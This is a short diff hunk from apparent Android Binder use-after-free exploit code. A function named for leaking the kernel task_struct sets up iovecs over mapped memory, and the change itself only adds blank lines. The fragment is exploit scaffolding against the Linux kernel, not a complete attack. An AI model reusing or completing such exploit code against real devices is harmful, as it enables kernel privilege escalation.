@@ -66,8 +66,10 @@ void binder_uaf_leak_task_struct(int binder_fd,
   INFO("Setting up iovecs");
 
   memset(iovecStack, 0, sizeof(iovecStack));
+
   iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
   iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE;
+
   iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
       (void *)((char *)(*mapped_memory) + PAGE_SIZE);
   iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE;
